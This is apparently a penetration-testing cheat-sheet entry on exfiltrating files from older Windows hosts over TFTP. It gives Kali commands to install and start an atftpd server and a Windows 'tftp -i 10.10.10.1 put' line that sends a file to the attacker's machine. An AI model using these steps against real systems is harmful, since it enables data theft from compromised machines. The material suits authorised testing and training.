# Data Exfiltration (TFTP)

TFTP is a UDP based FTP, and is a great option for Windows systems prior to 7 or Server 2008 R2 as these versions and above have Powershell installed which will achieve the same job as TFTP is not installed by default on these newer systems.

#### Setup TFTP Server

```
kali@kali:~$ sudo apt update && sudo apt install atftp
kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

#### Windows File Transfer

```
C:\Temp> tftp -i 10.10.10.1 put some.file
```
